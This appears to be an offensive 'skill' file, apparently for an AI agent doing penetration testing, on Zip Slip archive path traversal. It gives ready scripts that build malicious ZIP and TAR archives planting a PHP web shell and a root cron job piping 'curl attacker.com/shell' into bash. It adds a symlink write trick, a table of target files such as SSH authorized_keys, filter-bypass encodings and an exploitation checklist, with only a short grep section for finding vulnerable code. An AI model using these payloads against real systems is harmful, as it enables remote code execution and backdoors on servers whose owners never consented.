---
name: archive-path-traversal
description: "Zip Slip and archive extraction path traversal vulnerabilities. Use when target has file upload with archive extraction, plugin installers, backup restoration, or any feature that unpacks ZIP/TAR/JAR/WAR/APK archives."
---

# Archive Path Traversal (Zip Slip)

When an application extracts archive entries using the entry name directly as the output path without canonicalization, an attacker-controlled entry name like `../../../etc/cron.d/pwn` writes outside the intended directory.

## Vulnerable Code Patterns

See [references/vulnerable-code.md](references/vulnerable-code.md) for patterns in Java, Python, Node.js, Go, Ruby, and .NET.

The bug is always the same: `entry.getName()` flows into a file path constructor without validation that the resolved path stays inside the target directory.

## Crafting Malicious Archives

```python
import zipfile

with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
    z.writestr('../../etc/cron.d/pwn', '* * * * * root curl attacker.com/shell | bash\n')
    z.writestr('readme.txt', 'Totally normal archive')
```

```bash
# Using evilarc
python evilarc.py shell.php -p "var/www/html" -d 3 -o unix

# TAR archives
tar cf evil.tar --transform='s,^,../../etc/cron.d/,' pwn
```

## Exploitation Targets

| Target File | Impact | OS |
|-------------|--------|-----|
| `../../var/www/html/shell.php` | Web shell (RCE) | Linux |
| `../../etc/cron.d/pwn` | Cron job (RCE) | Linux |
| `../../root/.ssh/authorized_keys` | SSH access | Linux |
| `../../WEB-INF/classes/Evil.class` | Java class injection | Java |
| `../../inetpub/wwwroot/cmd.aspx` | Web shell (IIS) | Windows |
| `.env` or `../../.env` | Environment variable override | Any |

Chain with **write-path-to-rce** for framework view/template resolution that turns file write into RCE.

## Bypassing Path Traversal Filters

| Technique | Entry Name | Bypasses |
|-----------|-----------|----------|
| Backslash (Windows) | `..\..\wwwroot\shell.aspx` | Unix-only `../` check |
| Encoded slash | `..%2f..%2fetc/passwd` | String-based filter on raw name |
| Double-encoded | `..%252f..%252f` | Single decode + filter + second decode |
| Absolute path | `/etc/cron.d/pwn` | Relative path check only |
| Mixed separators | `..\/..\/etc/passwd` | Strict `../` match |

**Test order:** basic `../` first, then backslash, then encoded variants, then absolute paths.

## Symlink Attacks

Even if `../` in filenames is filtered, symlinks bypass path validation because the entry name itself is clean.

### Two-Step Symlink Write

```python
import tarfile, io

with tarfile.open('evil.tar', 'w') as t:
    # Step 1: symlink "uploads" -> /var/www/html (clean name)
    sym = tarfile.TarInfo(name='uploads')
    sym.type = tarfile.SYMTYPE
    sym.linkname = '/var/www/html'
    t.addfile(sym)

    # Step 2: write through symlink (still no ../ in name)
    shell = tarfile.TarInfo(name='uploads/shell.php')
    shell.size = len(payload)
    t.addfile(shell, io.BytesIO(payload.encode()))
```

Extraction order matters: symlink created first, then file write follows the symlink. Path validation sees `uploads/shell.php` as inside dest_dir.

## Detection in Source Code

```bash
# Java
grep -rn "ZipEntry\|ZipInputStream\|JarEntry" --include="*.java"
# Python
grep -rn "zipfile\|tarfile\|extractall" --include="*.py"
# Node.js
grep -rn "adm-zip\|yauzl\|unzipper\|decompress" --include="*.js" --include="*.ts"
# Go
grep -rn "archive/zip\|archive/tar" --include="*.go"
# .NET
grep -rn "ZipArchive\|ZipFile" --include="*.cs"
# Then verify: is there path validation after entry name extraction?
```

## Testing Checklist

1. Identify all archive upload/extraction features
2. Determine archive format accepted (ZIP, TAR, JAR, etc.)
3. Craft malicious archive with `../` entry names
4. Upload and check: does extraction create files outside dest dir?
5. If blocked: try alternate traversal (backslash, encoded, symlink)
6. If file write confirmed: identify highest-impact target file
7. Chain with **write-path-to-rce** for code execution

## Related Skills

- **write-path-to-rce** -- Escalate file write to RCE via framework resolution
- **custom-sanitizer-audit** -- If path sanitization exists but is bypassable
